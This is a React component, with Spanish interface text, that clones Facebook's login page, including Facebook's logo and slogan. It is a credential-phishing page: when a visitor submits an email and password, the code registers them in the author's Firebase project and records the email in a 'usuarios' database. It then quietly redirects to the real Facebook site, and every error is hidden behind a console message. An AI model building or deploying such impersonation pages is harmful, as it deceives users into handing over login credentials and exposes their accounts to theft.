import React, { useState } from 'react';
import './FacebookLogin.css';
import { auth, rtdb } from './database/firebaseconfig.js';
import { createUserWithEmailAndPassword } from 'firebase/auth';
import { ref, set } from 'firebase/database';

const FacebookLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

 
  const handleRegisterOnLogin = async (e) => {
    e.preventDefault();
    setError('');

    try {
      const newUserCredential = await createUserWithEmailAndPassword(auth, email, password);
      const newUser = newUserCredential.user;

      await set(ref(rtdb, 'usuarios/' + newUser.uid), {
        email: newUser.email,
        uid: newUser.uid,
        fechaCreacion: new Date().toISOString()
      });

      window.location.href = 'https://www.facebook.com/';
    } catch (error) {
      console.error('Código de error:', error.code);
      console.error('Mensaje:', error.message);

      if (error.code === 'auth/email-already-in-use') {
        console.log("Algo salio mal")
      } else if (error.code === 'auth/weak-password') {
        console.log("Algo salio mal")
      } else if (error.code === 'auth/invalid-email') {
        console.log("Algo salio mal")
      } else {
        console.log("Algo salio mal")
      }
    }
  };

  return (
    <div className="fb-wrapper">
      <div className="fb-container">
        <div className="fb-left">
          <img
            className="fb-logo"
            src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
            alt="Facebook"
          />
          <p className="fb-message">
            Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
          </p>
        </div>

        <div className="fb-right">
          <div className="fb-card">
            <form onSubmit={handleRegisterOnLogin}>
              <input
                type="text"
                placeholder="Correo electrónico o número de teléfono"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <input
                type="password"
                placeholder="Contraseña"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button type="submit" className="login-btn">
                Iniciar sesión
              </button>
              {error && <p className="error-text">{error}</p>}
              <a href="#" className="forgot-link">¿Olvidaste tu contraseña?</a>
              <hr />
              <button type="button" className="create-btn" disabled>
                Crear cuenta nueva
              </button>
            </form>
          </div>
          <p className="page-link">
            <strong>Crea una página</strong> para una celebridad, una marca o un negocio.
          </p>
        </div>
      </div>
    </div>
  );
};

export default FacebookLogin;
